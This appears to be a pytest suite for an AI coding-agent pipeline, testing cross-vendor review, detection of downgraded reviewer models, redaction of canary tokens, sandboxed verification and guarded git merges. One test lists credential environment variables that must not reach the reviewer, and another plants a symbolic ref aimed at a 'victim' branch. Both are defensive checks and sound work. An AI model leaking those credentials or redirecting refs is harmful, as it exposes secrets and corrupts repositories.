
    def runner(argv, env, timeout):
        calls.append((list(argv), env))
        return 0, "reviewer text\n" + MODEL_OK + "CLOUD-REVIEW: APPROVE\n"

    res = cc.review(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer="claude",
                    base_oid=world.base, candidate_oid=data["candidate_oid"], manifest=data["manifest"],
                    runner=runner)
    assert res.ok and res.state == "reviewed"
    assert res.data["family"] == "codex" and res.data["verdict"] == "APPROVE"
    assert res.data["tree"] == data["tree"]
    assert res.data["patch_id"] == cc.patch_id(str(world.main), world.base, data["candidate_oid"])
    diff = git(world.main, "diff", world.base, data["candidate_oid"])
    assert len(res.data["diff_sha"]) == 64 and "a = 2" in diff
    argv, env = calls[0]
    assert argv[2:5] == [RUN, TASK, "claude"] and argv[-1] == "1"
    assert env["FFS_CROSS_VENDOR_FALLBACK"] == "off" and env["ADVERSARY_SEAM"] == "cloud-review"


@pytest.mark.parametrize("rc,out,state,blocker", [
    (1, "bad\nCLOUD-REVIEW: REVISE\n", "rejected", cc.B_REVIEW_REVISE),
    (3, "CLOUD-REVIEW: UNAVAILABLE\n", "needs-operator", cc.B_REVIEW_UNAVAILABLE),
    (4, "CLOUD-REVIEW: cap\n", "needs-operator", cc.B_REVIEW_CAP),
    (0, "no final line\n", "needs-operator", cc.B_REVIEW_UNAVAILABLE),
    (0, "CLOUD-REVIEW: REVISE\n", "needs-operator", cc.B_REVIEW_UNAVAILABLE),
    (2, "CLOUD-REVIEW: APPROVE\n", "needs-operator", cc.B_REVIEW_UNAVAILABLE),
    (124, "", "needs-operator", cc.B_REVIEW_UNAVAILABLE),
])
def test_review_outcomes(world, rc, out, state, blocker):
    data = candidate_for(world)
    res = cc.review(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer="codex",
                    base_oid=world.base, candidate_oid=data["candidate_oid"], manifest=data["manifest"],
                    runner=lambda *_a: (rc, out))
    assert_fail(res, state, blocker)
    assert res.data["family"] == "claude"


def test_review_unknown_producer(world):
    data = candidate_for(world)
    res = cc.review(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer="gemini",
                    base_oid=world.base, candidate_oid=data["candidate_oid"], manifest={}, runner=lambda *_a: (0, ""))
    assert_fail(res, "needs-operator", cc.B_REVIEW_UNAVAILABLE)


def test_review_text_is_redacted(world):
    data = candidate_for(world)
    leak = cloud_scan.canary("github-token").decode()
    res = cc.review(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer="claude",
                    base_oid=world.base, candidate_oid=data["candidate_oid"], manifest=data["manifest"],
                    runner=lambda *_a: (0, "found %s\n" % leak + MODEL_OK + "CLOUD-REVIEW: APPROVE\n"))
    assert leak not in res.data["review_text"] and "[REDACTED:github-token]" in res.data["review_text"]


def _review_with(world, out, rc=0, producer="claude"):
    data = candidate_for(world)
    return cc.review(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer=producer,
                     base_oid=world.base, candidate_oid=data["candidate_oid"], manifest=data["manifest"],
                     runner=lambda *_a: (rc, out))


def test_approved_with_the_requested_model_is_reviewed_and_records_the_model(world):
    res = _review_with(world, "fine\n" + MODEL_OK + "CLOUD-REVIEW: APPROVE\n")
    assert res.ok and res.state == "reviewed"
    assert res.data["model"] == "gpt-6.2-sol" and res.data["requested_model"] == "gpt-6.2-sol"
    assert "CLOUD-REVIEW-MODEL" not in res.data["review_text"]


def test_approved_by_a_downgraded_model_needs_the_operator(world):
    res = _review_with(world, "CLOUD-REVIEW-MODEL: requested=gpt-6.2-sol answered=gpt-6.1-terra descent=1\n"
                              "CLOUD-REVIEW: APPROVE\n")
    assert_fail(res, "needs-operator", cc.B_REVIEW_MODEL_DOWNGRADED)
    assert res.data["model"] == "gpt-6.1-terra" and res.data["requested_model"] == "gpt-6.2-sol"
    assert "gpt-6.1-terra" in res.detail and "gpt-6.2-sol" in res.detail


def test_a_descent_flag_blocks_even_when_the_names_match(world):
    res = _review_with(world, "CLOUD-REVIEW-MODEL: requested=gpt-6.2-sol answered=gpt-6.2-sol descent=1\n"
                              "CLOUD-REVIEW: APPROVE\n")
    assert_fail(res, "needs-operator", cc.B_REVIEW_MODEL_DOWNGRADED)


@pytest.mark.parametrize("out", [
    "fine\nCLOUD-REVIEW: APPROVE\n",  # an older script, or no model line at all
    "CLOUD-REVIEW-MODEL: requested=gpt-6.2-sol answered=- descent=0\nCLOUD-REVIEW: APPROVE\n",
    "CLOUD-REVIEW-MODEL: requested=- answered=- descent=0\nCLOUD-REVIEW: APPROVE\n",
    "CLOUD-REVIEW-MODEL: requested=gpt-6.2-sol answered=gpt-6.2-sol descent=2\nCLOUD-REVIEW: APPROVE\n",
    # reviewer text cannot stand in for it: the model line must sit directly before the verdict
    MODEL_OK + "reviewer closing remark\nCLOUD-REVIEW: APPROVE\n",
])
def test_approved_with_an_unknown_model_needs_the_operator(world, out):
    res = _review_with(world, out)
    assert_fail(res, "needs-operator", cc.B_REVIEW_MODEL_UNKNOWN)


def test_revise_still_rejects_and_keeps_the_model_line_out_of_the_text(world):
    res = _review_with(world, "HIGH: bad\n" + MODEL_OK + "CLOUD-REVIEW: REVISE\n", rc=1)
    assert_fail(res, "rejected", cc.B_REVIEW_REVISE)
    assert "CLOUD-REVIEW-MODEL" not in res.detail and res.data["model"] == "gpt-6.2-sol"


def test_review_script_end_to_end_with_stub(world, tmp_path):
    """The real script, with a stub reviewer binary and a temp gates store."""
    data = candidate_for(world)
    stub = tmp_path / "codex-stub"
    stub.write_text("#!/usr/bin/env bash\nlast=''\nwhile [ $# -gt 0 ]; do case \"$1\" in "
                    "--output-last-message) last=\"$2\"; shift 2;; *) shift;; esac; done\n"
                    "cat >/dev/null; printf 'fine\\nVERDICT: APPROVE\\n' > \"$last\"\n")
    stub.chmod(0o755)
    os.environ["ADVERSARY_BIN_CODEX"] = str(stub)
    os.environ["GATES_STORE"] = str(tmp_path / "gates.json")
    os.environ["FFS_ADVERSARY_MODEL_PROBE"] = "off"
    try:
        res = cc.review(repo=str(world.main), run="Run.A_1", task=TASK, generation=GEN, producer="claude",
                        base_oid=world.base, candidate_oid=data["candidate_oid"], manifest=data["manifest"])
    finally:
        for name in ("ADVERSARY_BIN_CODEX", "GATES_STORE", "FFS_ADVERSARY_MODEL_PROBE"):
            os.environ.pop(name, None)
    assert res.ok and res.data["verdict"] == "APPROVE", res


# ---------------------------------------------- binary, outbound scan, env (K2, K3)


def test_binary_change_in_owns_refuses_review_by_diff(world):
    oid = world.result({"src/a/logo.png": b"\x89PNG\r\n\x1a\n\x00\x00\x00binary"})
    res = cc.collect(world.ctx(oid))
    assert res.ok, res
    called = []
    out = cc.review(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer="claude", base_oid=world.base,
                    candidate_oid=res.data["candidate_oid"], manifest=res.data["manifest"],
                    runner=lambda *a: called.append(a) or (0, "CLOUD-REVIEW: APPROVE\n"))
    assert_fail(out, "needs-operator", cc.B_BINARY_CHANGE)
    assert out.data["paths"] == ["src/a/logo.png"] and not called


def test_every_binary_change_blocks_review(world):
    oid = world.result({"src/a/logo.png": b"\x89PNG\r\n\x1a\n\x00\x00\x00binary", "src/a/blob.bin": b"\x00\x01\x02"})
    res = cc.collect(world.ctx(oid))
    called = []
    kwargs = dict(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer="claude", base_oid=world.base,
                  candidate_oid=res.data["candidate_oid"], manifest=res.data["manifest"],
                  runner=lambda *a: called.append(a) or (0, "CLOUD-REVIEW: APPROVE\n"))
    blocked = cc.review(**kwargs)
    assert_fail(blocked, "needs-operator", cc.B_BINARY_CHANGE)
    assert sorted(blocked.data["paths"]) == ["src/a/blob.bin", "src/a/logo.png"]
    assert not called


def test_review_binds_candidate_tree_and_base(world):
    data = candidate_for(world)
    res = cc.review(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer="claude", base_oid=world.base,
                    candidate_oid=data["candidate_oid"], manifest=data["manifest"],
                    runner=lambda *_a: (0, "CLOUD-REVIEW: APPROVE\n"))
    assert (res.data["tree"], res.data["base_oid"], res.data["candidate_oid"]) == (
        data["tree"], world.base, data["candidate_oid"])


def test_secret_in_decoded_manifest_summary_never_reaches_the_reviewer(world):
    data = candidate_for(world)
    manifest = dict(data["manifest"], summary="fixed %s" % cloud_scan.canary("github-token").decode())
    called = []
    res = cc.review(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer="claude", base_oid=world.base,
                    candidate_oid=data["candidate_oid"], manifest=manifest,
                    runner=lambda *a: called.append(a) or (0, "CLOUD-REVIEW: APPROVE\n"))
    assert_fail(res, "rejected", cc.B_SECRET_LEAK)
    assert not called


def test_deleted_base_secret_is_redacted_in_the_outbound_diff(world):
    token = cloud_scan.canary("github-token").decode()
    git(world.origin, "checkout", "-q", "-B", "res", world.base)
    base2 = world.commit(world.origin, {"src/a/old.txt": "k=%s\n" % token}, "legacy secret")
    git(world.main, "fetch", "-q", str(world.origin), "res:refs/heads/base2")
    data = make_candidate(world, {"src/a/old.txt": None}, base=base2)
    seen = {}

    def runner(argv, env, timeout):
        seen["diff"] = Path(argv[5]).read_text()
        return 0, MODEL_OK + "CLOUD-REVIEW: APPROVE\n"

    res = cc.review(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer="claude", base_oid=base2,
                    candidate_oid=data["candidate_oid"], manifest=data["manifest"], runner=runner)
    assert res.ok, res
    assert token not in seen["diff"] and "[REDACTED:github-token]" in seen["diff"]


def test_reviewer_runs_with_an_allowlisted_environment(world, monkeypatch):
    data = candidate_for(world)
    for name in ("ANTHROPIC_API_KEY", "OPENAI_API_KEY", "DOPPLER_TOKEN", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY",
                 "SSH_AUTH_SOCK", "FFS_UNRELATED"):
        monkeypatch.setenv(name, "secret-value")
    monkeypatch.setenv("FFS_ADVERSARY_MODEL_PROBE", "off")
    monkeypatch.setenv("CODEX_HOME", "/tmp/codex-home")
    seen = {}
    cc.review(repo=str(world.main), run=RUN, task=TASK, generation=GEN, producer="claude", base_oid=world.base,
              candidate_oid=data["candidate_oid"], manifest=data["manifest"],
              runner=lambda argv, env, timeout: seen.update(env=env) or (0, MODEL_OK + "CLOUD-REVIEW: APPROVE\n"))
    env = seen["env"]
    assert set(env) <= set(cc.REVIEW_ENV_ALLOW)
    for name in ("ANTHROPIC_API_KEY", "OPENAI_API_KEY", "DOPPLER_TOKEN", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY",
                 "SSH_AUTH_SOCK", "FFS_UNRELATED"):
        assert name not in env
    assert env["CODEX_HOME"] == "/tmp/codex-home" and env["FFS_ADVERSARY_MODEL_PROBE"] == "off"
    assert env["PATH"] and env["GSD_RUN_ID"] == RUN


def test_review_timeout_kills_the_reviewer_process_group(tmp_path):
    pidfile = tmp_path / "pid"
    script = "sleep 60 & echo $! > %s; wait" % pidfile
    rc, out = cc.default_runner(["bash", "-c", script], dict(os.environ), 1)
    assert (rc, out) == (124, "")
    pid = int(pidfile.read_text())
    deadline = time.time() + 5
    while time.time() < deadline:
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            break
        time.sleep(0.1)
    else:
        os.kill(pid, 9)
        pytest.fail("the reviewer's child survived the timeout")


# ------------------------------------------------------------------- verify


def test_verify_pass_and_fail(world, tmp_path):
    log = tmp_path / "v.log"

    def runner_ok(tree, cmd, **kw):
        Path(kw["log_path"]).write_text("all good\n")
        return 0

    def runner_bad(tree, cmd, **kw):
        Path(kw["log_path"]).write_text("1 failed\n")
        return 1

    args: Dict[str, Any] = dict(tree_oid="a" * 40, cmd="make test", repo=str(world.main),
                                main_worktree=str(world.main), deps=["node_modules"], timeout_s=5,
                                log_path=str(log))
    good = cc.verify(run_verify_fn=runner_ok, **args)
    assert good.ok and good.state == "verified" and good.data["test_rc"] == 0 and len(good.data["test_log_sha"]) == 64
    bad = cc.verify(run_verify_fn=runner_bad, **args)
    assert_fail(bad, "rejected", cc.B_TESTS_FAILED)
    assert "1 failed" in bad.detail and bad.data["test_rc"] == 1


def test_verify_sandbox_unavailable_and_error(world, tmp_path):
    def unavailable(*_a, **_k):
        raise cloud_sandbox.SandboxUnavailable("no sandbox")

    def broken(*_a, **_k):
        raise cloud_sandbox.SandboxError("symlink in tree")

    args: Dict[str, Any] = dict(tree_oid="a" * 40, cmd="x", repo=str(world.main), main_worktree=str(world.main),
                                deps=[], timeout_s=5, log_path=str(tmp_path / "v.log"))
    assert_fail(cc.verify(run_verify_fn=unavailable, **args), "needs-operator", cc.B_SANDBOX)
    assert_fail(cc.verify(run_verify_fn=broken, **args), "needs-operator", cc.B_SANDBOX)


@pytest.mark.parametrize("blank", ["", " ", "   \n\t ", None])
def test_verify_refuses_a_blank_command_without_running_anything(world, tmp_path, blank):
    calls = []

    def runner(*args, **kw):
        calls.append(args)
        return 0  # what `bash -c ''` would report: a pass with no test run

    res = cc.verify(tree_oid="a" * 40, cmd=blank, repo=str(world.main), main_worktree=str(world.main), deps=[],
                    timeout_s=5, log_path=str(tmp_path / "v.log"), run_verify_fn=runner)
    assert_fail(res, "needs-operator", cc.B_VERIFY_CMD_BLANK)
    assert not res.ok and res.state != "verified" and calls == []


@pytest.mark.skipif(not cloud_sandbox.sandbox_available(), reason="sandbox-exec unavailable")
def test_verify_real_sandbox_on_candidate_tree(world, tmp_path):
    data = candidate_for(world)
    res = cc.verify(tree_oid=data["tree"], cmd="test -f src/a/x.py && ! test -e .ffs-result", repo=str(world.main),
                    main_worktree=str(world.main), deps=[], timeout_s=60, log_path=str(tmp_path / "v.log"))
    assert res.ok, res


def test_verify_slot_limits_concurrency(tmp_path):
    first = cc.verify_slot(str(tmp_path / "d"), 2)
    second = cc.verify_slot(str(tmp_path / "d"), 2)
    third = cc.verify_slot(str(tmp_path / "d"), 2)
    assert first is not None and second is not None and third is None
    first.close()
    again = cc.verify_slot(str(tmp_path / "d"), 2)
    assert again is not None
    for handle in (second, again):
        handle.close()


# -------------------------------------------------------------- integration


def make_candidate(world: World, files: Dict[str, Any], base: Optional[str] = None) -> Dict[str, Any]:
    base = base or world.base
    git(world.origin, "checkout", "-q", "-B", "res", base)
    oid = world.commit(world.origin, dict(files, **{MANIFEST_PATH: manifest_text(base)}), "work")
    res = cc.collect(world.ctx(oid, base_sha=base, owns=["**"]))
    assert res.ok, res
    res.data["patch_id"] = cc.patch_id(str(world.main), base, res.data["candidate_oid"])
    return res.data


INTEGRATION_REF = "refs/heads/ffs/cloud/r1/integration"
PUB_REF = "refs/ffs/cloud/r1/pub/t1-g1"


def set_tip(world: World, oid: str) -> None:
    git(world.main, "update-ref", INTEGRATION_REF, oid)


def advance_main(world: World, files: Dict[str, Any]) -> str:
    git(world.main, "checkout", "-q", "-B", "other", world.base)
    return world.commit(world.main, files, "other work")


def plan(world: World, tip: str, data: Dict[str, Any]) -> cc.StepResult:
    return cc.plan_integration(repo=str(world.main), expected_tip=tip, candidate_oid=data["candidate_oid"],
                               reviewed_patch_id=data["patch_id"], pub_ref=PUB_REF,
                               task=TASK)


def test_fast_forward_plan_and_apply(world):
    data = make_candidate(world, ok_changes())
    set_tip(world, world.base)
    res = plan(world, world.base, data)
    assert res.ok and res.state == "integrating"
    assert res.data["mode"] == "fast-forward" and res.data["publish_oid"] == data["candidate_oid"]
    assert res.data["needs_retest"] is False and res.data["tree"] == data["tree"]
    assert git(world.main, "rev-parse", PUB_REF) == data["candidate_oid"]
    done = cc.apply_integration(repo=str(world.main), ref=INTEGRATION_REF, publish_oid=res.data["publish_oid"],
                                expected_tip=world.base)
    assert done.ok and done.state == "integrated"
    assert git(world.main, "rev-parse", INTEGRATION_REF) == data["candidate_oid"]


def test_clean_merge_plan(world):
    data = make_candidate(world, {"src/a/x.py": "a = 2\n"})
    tip = advance_main(world, {"src/b/y.py": "b = 2\n"})
    set_tip(world, tip)
    res = plan(world, tip, data)
    assert res.ok, res
    assert res.data["mode"] == "merge" and res.data["needs_retest"] is True
    merged = res.data["publish_oid"]
    assert git(world.main, "rev-parse", merged + "^1") == tip
    assert git(world.main, "rev-parse", merged + "^2") == data["candidate_oid"]
    assert git(world.main, "show", merged + ":src/a/x.py") == "a = 2" and git(world.main, "show", merged + ":src/b/y.py") == "b = 2"
    assert git(world.main, "rev-parse", PUB_REF) == merged
    assert git(world.main, "worktree", "list").count("\n") == 0
    done = cc.apply_integration(repo=str(world.main), ref=INTEGRATION_REF, publish_oid=merged, expected_tip=tip)
    assert done.ok and git(world.main, "rev-parse", INTEGRATION_REF) == merged


def test_merge_of_candidates_with_a_directory_case_collision_is_refused(world):
    first = make_candidate(world, {"src/UI/a.ts": ("blob", "1\n")})
    git(world.main, "update-ref", "-d", first["candidate_ref"])  # same task id: free the ref for the second one
    second = make_candidate(world, {"src/ui/b.ts": ("blob", "2\n")})
    set_tip(world, first["candidate_oid"])
    res = plan(world, first["candidate_oid"], second)
    assert_fail(res, "needs-operator", cc.B_MERGE_CONFLICT)
    assert "case-colliding" in res.detail and "src/ui/b.ts" in res.detail
    assert git(world.main, "rev-parse", "--verify", "--quiet", PUB_REF, check=False) == ""


def test_merge_conflict_blocks_and_does_not_pin(world):
    data = make_candidate(world, {"src/a/x.py": "a = 2\n"})
    tip = advance_main(world, {"src/a/x.py": "a = 3\n"})
    res = plan(world, tip, data)
    assert_fail(res, "needs-operator", cc.B_MERGE_CONFLICT)
    assert git(world.main, "rev-parse", "--verify", "--quiet", PUB_REF, check=False) == ""
    assert git(world.main, "worktree", "list").count("\n") == 0
    assert git(world.main, "status", "--porcelain") == ""


def test_overlapping_files_are_refused_even_when_the_text_merges_cleanly(world):
    lines = "".join("l%d\n" % i for i in range(1, 10))
    data = make_candidate(world, {"src/a/lines.txt": lines.replace("l7\n", "L7\n")})
    tip = advance_main(world, {"src/a/lines.txt": lines.replace("l5\n", "L5\n")})
    res = plan(world, tip, data)
    assert_fail(res, "needs-operator", cc.B_MERGE_CONFLICT)
    assert "both sides changed" in res.detail
    assert git(world.main, "rev-parse", "--verify", "--quiet", PUB_REF, check=False) == ""


def test_merge_with_wrong_reviewed_patch_id_is_refused(world):
    data = make_candidate(world, {"src/a/x.py": "a = 2\n"})
    tip = advance_main(world, {"src/b/y.py": "b = 2\n"})
    data["patch_id"] = "e" * 40
    assert_fail(plan(world, tip, data), "needs-operator", cc.B_PATCH_ID)


def test_merged_tree_is_exactly_tip_plus_the_reviewed_paths(world):
    data = make_candidate(world, {"src/a/x.py": "a = 2\n", "src/a/new.py": "n = 1\n"})
    tip = advance_main(world, {"src/b/y.py": "b = 2\n", "README.md": "other\n"})
    res = plan(world, tip, data)
    assert res.ok and res.data["mode"] == "merge", res
    merged = res.data["publish_oid"]
    changed = git(world.main, "diff", "--name-only", tip, merged).splitlines()
    assert sorted(changed) == ["src/a/new.py", "src/a/x.py"]
    for path in changed:
        assert git(world.main, "rev-parse", merged + ":" + path) == git(world.main, "rev-parse", data["candidate_oid"] + ":" + path)
    assert git(world.main, "rev-parse", merged + ":README.md") == git(world.main, "rev-parse", tip + ":README.md")
    again = plan(world, tip, data)
    assert again.data["publish_oid"] == merged  # deterministic: replay lands on the same commit


def test_merge_of_a_deletion_and_disjoint_edit(world):
    data = make_candidate(world, {"src/a/lines.txt": None})
    tip = advance_main(world, {"src/b/y.py": "b = 2\n"})
    res = plan(world, tip, data)
    assert res.ok, res
    assert git(world.main, "ls-tree", "-r", "--name-only", res.data["publish_oid"]).count("lines.txt") == 0


def test_directory_file_collision_is_refused(world):
    data = make_candidate(world, {"src/c/deep.py": "d = 1\n"})
    tip = advance_main(world, {"src/c": "now a file\n"})
    assert_fail(plan(world, tip, data), "needs-operator", cc.B_MERGE_CONFLICT)


def test_reviewed_tree_must_still_match(world):
    data = make_candidate(world, ok_changes())
    set_tip(world, world.base)
    bad = cc.plan_integration(repo=str(world.main), expected_tip=world.base, candidate_oid=data["candidate_oid"],
                              reviewed_patch_id=data["patch_id"], pub_ref=PUB_REF, task=TASK, reviewed_tree="1" * 40)
    assert_fail(bad, "needs-operator", cc.B_PATCH_ID)
    good = cc.plan_integration(repo=str(world.main), expected_tip=world.base, candidate_oid=data["candidate_oid"],
                               reviewed_patch_id=data["patch_id"], pub_ref=PUB_REF, task=TASK, reviewed_tree=data["tree"])
    assert good.ok


def test_merge_never_touches_registered_worktrees(world, tmp_path):
    """No `git worktree add` and no `git worktree prune` on the operator's repo (K5)."""
    git(world.main, "worktree", "add", "-q", "--detach", str(tmp_path / "away"), world.base)
    shutil.rmtree(tmp_path / "away")  # e.g. a worktree on an unmounted volume
    data = make_candidate(world, {"src/a/x.py": "a = 2\n"})
    tip = advance_main(world, {"src/b/y.py": "b = 2\n"})
    assert plan(world, tip, data).ok
    assert len(list((world.main / ".git" / "worktrees").iterdir())) == 1  # still registered, not pruned


def test_patch_id_is_whitespace_exact(world):
    one = world.commit(world.origin, {"src/a/x.py": "a = 2\n"}, "one")
    git(world.origin, "checkout", "-q", "-B", "res2", world.base)
    two = world.commit(world.origin, {"src/a/x.py": "a  =  2\n"}, "two")
    git(world.main, "fetch", "-q", str(world.origin), "res:refs/heads/o1", "res2:refs/heads/o2")
    assert cc.patch_id(str(world.main), world.base, one) != cc.patch_id(str(world.main), world.base, two)


def test_patch_id_mismatch_on_wrong_reviewed_id(world):
    data = make_candidate(world, ok_changes())
    data["patch_id"] = "f" * 40
    assert_fail(plan(world, world.base, data), "needs-operator", cc.B_PATCH_ID)


def test_already_integrated_is_noop(world):
    data = make_candidate(world, ok_changes())
    res = plan(world, data["candidate_oid"], data)
    assert res.ok and res.data["mode"] == "noop" and res.data["publish_oid"] == data["candidate_oid"]


def test_plan_rejects_bad_oids(world):
    data = make_candidate(world, ok_changes())
    res = cc.plan_integration(repo=str(world.main), expected_tip="nope", candidate_oid=data["candidate_oid"],
                              reviewed_patch_id="x", pub_ref="refs/ffs/x")
    assert_fail(res, "needs-operator", cc.B_GIT)


def test_replan_overwrites_pin(world):
    data = make_candidate(world, {"src/a/x.py": "a = 2\n"})
    tip1 = advance_main(world, {"src/b/y.py": "b = 2\n"})
    first = plan(world, tip1, data)
    tip2 = world.commit(world.main, {"README.md": "hello\n"}, "more")
    second = plan(world, tip2, data)
    assert first.ok and second.ok and first.data["publish_oid"] != second.data["publish_oid"]
    assert git(world.main, "rev-parse", PUB_REF) == second.data["publish_oid"]


def test_update_ref_compare_and_swap_loses_race(world):
    data = make_candidate(world, ok_changes())
    set_tip(world, world.base)
    res = plan(world, world.base, data)
    rival = advance_main(world, {"src/b/y.py": "b = 9\n"})
    set_tip(world, rival)  # another integrator won the race
    lost = cc.apply_integration(repo=str(world.main), ref=INTEGRATION_REF, publish_oid=res.data["publish_oid"],
                                expected_tip=world.base)
    assert_fail(lost, "verified", cc.B_TIP_MOVED)
    assert git(world.main, "rev-parse", INTEGRATION_REF) == rival


def test_apply_refuses_foreign_refs_and_non_descendants(world):
    data = make_candidate(world, ok_changes())
    set_tip(world, world.base)
    for ref in ("refs/heads/main", "refs/heads/ffs/cloud/r1/other", "refs/heads/ffs/cloud/../x/integration",
                "refs/ffs/cloud/r1/integration"):
        res = cc.apply_integration(repo=str(world.main), ref=ref, publish_oid=data["candidate_oid"],
                                   expected_tip=world.base)
        assert_fail(res, "needs-operator", cc.B_GIT)
    stranger = advance_main(world, {"README.md": "other\n"})
    res = cc.apply_integration(repo=str(world.main), ref=INTEGRATION_REF, publish_oid=stranger,
                               expected_tip=data["candidate_oid"])
    assert_fail(res, "needs-operator", cc.B_TIP_MOVED)
    assert git(world.main, "rev-parse", INTEGRATION_REF) == world.base


def test_apply_refuses_a_symbolic_integration_ref_and_moves_nothing(world):
    data = make_candidate(world, ok_changes())
    git(world.main, "branch", "victim", world.base)
    git(world.main, "symbolic-ref", INTEGRATION_REF, "refs/heads/victim")  # at the expected tip, so a CAS would pass
    res = cc.apply_integration(repo=str(world.main), ref=INTEGRATION_REF, publish_oid=data["candidate_oid"],
                               expected_tip=world.base)
    assert_fail(res, "needs-operator", cc.B_GIT)
    assert git(world.main, "rev-parse", "victim") == world.base
    assert git(world.main, "symbolic-ref", INTEGRATION_REF) == "refs/heads/victim"


def test_apply_missing_ref_reports_tip_moved(world):
    data = make_candidate(world, ok_changes())
    res = cc.apply_integration(repo=str(world.main), ref=INTEGRATION_REF, publish_oid=data["candidate_oid"],
                               expected_tip=world.base)
    assert_fail(res, "verified", cc.B_TIP_MOVED)


def test_operator_branch_and_worktree_untouched(world):
    data = make_candidate(world, {"src/a/x.py": "a = 2\n"})
    tip = advance_main(world, {"src/b/y.py": "b = 2\n"})
    git(world.main, "checkout", "-q", "main")
    head_before = git(world.main, "rev-parse", "HEAD")
    set_tip(world, tip)
    res = plan(world, tip, data)
    cc.apply_integration(repo=str(world.main), ref=INTEGRATION_REF, publish_oid=res.data["publish_oid"],
                         expected_tip=tip)
    assert git(world.main, "rev-parse", "HEAD") == head_before
    assert git(world.main, "symbolic-ref", "HEAD") == "refs/heads/main"
    assert git(world.main, "status", "--porcelain") == ""
